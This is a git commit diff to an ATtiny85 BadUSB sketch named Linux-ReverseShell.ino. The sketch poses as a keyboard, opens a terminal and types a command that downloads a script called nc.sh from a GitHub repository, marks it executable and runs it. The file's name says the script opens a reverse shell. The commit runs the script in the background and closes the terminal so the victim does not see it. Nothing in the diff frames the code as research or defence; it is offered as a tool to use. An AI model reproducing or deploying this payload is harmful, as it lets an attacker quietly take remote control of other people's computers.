5f2dc21361f1590b42dabff081d68f0b3e404f1d
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-18 14:21:12 +0000

    Update Linux-ReverseShell.ino

--- ATtiny85/Linux-ReverseShell.ino
+++ ATtiny85/Linux-ReverseShell.ino
@@ -8,7 +8,7 @@ DigiKeyboard.sendKeyStroke("terminal");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
-DigiKeyboard.sendKeyStroke("cd && curl -o nc.sh https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/MacOS/nc.sh && chmod +x nc.sh &&./nc.sh");
+DigiKeyboard.sendKeyStroke("cd && curl -o nc.sh https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/MacOS/nc.sh && chmod +x nc.sh && ./nc.sh & exit");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
